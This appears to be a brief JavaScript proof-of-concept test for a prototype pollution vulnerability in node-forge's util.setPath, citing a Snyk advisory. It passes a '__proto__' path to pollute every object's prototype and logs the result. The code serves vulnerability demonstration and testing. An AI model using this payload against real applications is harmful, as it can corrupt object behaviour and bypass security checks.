// //https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-609293
// test("prototype pollution in node-forge", () => {
console.log({}.polluted);

  const nodeforge = require("node-forge");
  const obj = {};
  //nodeforge.util.setPath(obj, ["constructor","prototype", "polluted"], "yes");
  nodeforge.util.setPath(obj, ["__proto__", "polluted"], "yes");

console.log({}.polluted);
// });
